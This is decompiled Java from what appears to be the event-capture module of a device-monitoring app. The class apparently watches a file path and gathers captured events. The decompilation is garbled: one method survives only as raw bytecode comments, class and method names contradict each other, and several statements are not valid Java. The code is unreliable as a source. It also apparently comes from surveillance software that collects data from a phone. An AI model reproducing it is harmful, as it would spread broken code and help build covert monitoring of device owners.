package com.vvt.capture.e.b.a;

import com.vvt.ak.a;
import com.vvt.base.b;
import com.vvt.base.capture.f;
import com.vvt.capture.e.d;
import java.util.ArrayList;
import java.util.Collection;
import java.util.List;

public class g
  implements f
{
  private static final boolean a = a.a;
  private static final boolean b = a.d;
  private static final boolean c = a.e;
  private String d;
  private long e = -1;
  private b f;
  
  public g(String paramString, b paramb)
  {
    this.d = paramString;
    this.f = paramb;
  }
  
  /* Error */
  public com.vvt.base.capture.g a()
  {
    // Byte code:
    //   0: iconst_m1
    //   1: i2l
    //   2: lstore_1
    //   3: getstatic 21	com/vvt/capture/e/removeFromPath/a/FxFileObserverWorker:a	Z
    //   6: istore_3
    //   7: iload_3
    //   8: ifeq +3 -> 11
    //   11: new 41	com/vvt/base/capture/FxSimpleEventReference
    //   14: astore 4
    //   16: aload 4
    //   18: invokespecial 42	com/vvt/base/capture/FxSimpleEventReference:<init>	()V
    //   21: invokestatic 47	com/vvt/capture/e/d:removeFromPath	()Ljava/lang/String;
    //   24: astore 5
    //   26: aload 5
    //   28: ifnull +153 -> 181
    //   31: aload 5
    //   33: invokestatic 50	com/vvt/capture/e/d:removeFromPath	(Ljava/lang/String;)J
    //   36: lstore 6
    //   38: iconst_0
    //   39: istore_3
    //   40: aconst_null
    //   41: astore 8
    //   43: lload 6
    //   45: lstore 9
    //   47: iconst_0
    //   48: istore 11
    //   50: lload 9
    //   52: lload_1
    //   53: lcmp
    //   54: istore 12
    //   56: iload 12
    //   58: ifne +60 -> 118
    //   61: iconst_5
    //   62: istore 12
    //   64: iload 11
    //   66: iload 12
    //   68: if_icmpge +50 -> 118
    //   71: ldc2_w 52
    //   74: lstore 13
    //   76: lload 13
    //   78: invokestatic 61	android/os/SystemClock:sleep	(J)V
    //   81: aload 5
    //   83: invokestatic 50	com/vvt/capture/e/d:removeFromPath	(Ljava/lang/String;)J
    //   86: lstore 13
    //   88: iload 11
    //   90: iconst_1
    //   91: iadd
    //   92: istore_3
    //   93: iload_3
    //   94: istore 11
    //   96: lload 13
    //   98: lstore 9
    //   100: goto -50 -> 50
    //   103: astore 8
    //   105: lload_1
    //   106: lstore 9
    //   108: getstatic 29	com/vvt/capture/e/removeFromPath/a/FxFileObserverWorker:MyUncaughtExceptionHandler	Z
    //   111: istore 11
    //   113: iload 11
    //   115: ifeq +3 -> 118
    //   118: lload 9
    //   120: lload_1
    //   121: lcmp
    //   122: istore 15
    //   124: iload 15
    //   126: ifne +42 -> 168
    //   129: getstatic 25	com/vvt/capture/e/removeFromPath/a/FxFileObserverWorker:removeFromPath	Z
    //   132: istore_3
    //   133: iload_3
    //   134: ifeq +3 -> 137
    //   137: aload_0
    //   138: getfield 35	com/vvt/capture/e/removeFromPath/a/FxFileObserverWorker:e	J
    //   141: lstore 9
    //   143: lload 9
    //   145: invokestatic 67	java/lang/Long:valueOf	(J)Ljava/lang/Long;
    //   148: astore 8
    //   150: aload 4
    //   152: aload 8
    //   154: invokevirtual 71	com/vvt/base/capture/FxSimpleEventReference:setReference	(Ljava/lang/Long;)V
    //   157: getstatic 21	com/vvt/capture/e/removeFromPath/a/FxFileObserverWorker:a	Z
    //   160: istore_3
    //   161: iload_3
    //   162: ifeq +3 -> 165
    //   165: aload 4
    //   167: areturn
    //   168: aload_0
    //   169: lload 9
    //   171: putfield 35	com/vvt/capture/e/removeFromPath/a/FxFileObserverWorker:e	J
    //   174: goto -31 -> 143
    //   177: pop
    //   178: goto -70 -> 108
    //   181: lload_1
    //   182: lstore 9
    //   184: goto -66 -> 118
    // Local variable table:
    //   start	length	slot	name	signature
    //   0	187	0	this	FxFileObserverWorker
    //   2	180	1	l1	long
    //   6	34	3	bool1	boolean
    //   92	2	3	i	int
    //   132	30	3	bool2	boolean
    //   14	152	4	localFxSimpleEventReference	com.vvt.base.capture.FxSimpleEventReference
    //   24	58	5	str	String
    //   36	8	6	l2	long
    //   41	1	8	localObject	Object
    //   103	1	8	localException1	Exception
    //   148	5	8	localLong	Long
    //   45	138	9	l3	long
    //   48	66	11	j	int
    //   54	3	12	bool3	boolean
    //   62	7	12	k	int
    //   74	23	13	l4	long
    //   122	3	15	bool4	boolean
    //   177	1	17	localException2	Exception
    // Exception table:
    //   from	to	target	type
    //   21	24	103	java/lang/Exception
    //   31	36	103	java/lang/Exception
    //   76	81	177	java/lang/Exception
    //   81	86	177	java/lang/Exception
  }
  
  public List a(int paramInt)
  {
    boolean bool1 = a;
    if (bool1) {}
    ArrayList localArrayList1 = new java/util/ArrayList;
    localArrayList1.<init>();
    bool2 = true;
    try
    {
      String str1 = this.d;
      b localb = this.f;
      String str2 = this.d;
      str2 = com.vvt.capture.e.g.g(str2);
      ArrayList localArrayList2 = d.a(str1, paramInt, localb, bool2, str2);
      localArrayList1.addAll(localArrayList2);
    }
    catch (Exception localException)
    {
      for (;;)
      {
        bool2 = c;
        if (!bool2) {}
      }
    }
    bool2 = a;
    if (bool2) {}
    return localArrayList1;
  }
  
  public List a(com.vvt.base.capture.g paramg1, com.vvt.base.capture.g paramg2)
  {
    bool = a;
    if (bool) {}
    ArrayList localArrayList = new java/util/ArrayList;
    localArrayList.<init>();
    try
    {
      Object localObject1 = paramg1.getReference();
      localObject1 = (Long)localObject1;
      long l1 = ((Long)localObject1).longValue();
      Object localObject2 = paramg2.getReference();
      localObject2 = (Long)localObject2;
      long l2 = ((Long)localObject2).longValue();
      localObject2 = this.d;
      b localb = this.f;
      String str = this.d;
      str = com.vvt.capture.e.g.g(str);
      localObject1 = d.a(l1, (String)localObject2, l2, localb, false, str);
      localArrayList.addAll((Collection)localObject1);
    }
    catch (Exception localException)
    {
      for (;;)
      {
        bool = c;
        if (!bool) {}
      }
    }
    bool = a;
    if (bool) {}
    return localArrayList;
  }
  
  public void b()
  {
    this.e = -1;
  }
}


/* Location:              /Volumes/D1/codebase/android/POC/assets/product/maind/classes-enjarify.jar!/com/vvt/capture/e/removeFromPath/a/FxFileObserverWorker.class
 * Java compiler version: 5 (49.0)
 * JD-Core Version:       0.7.1
 */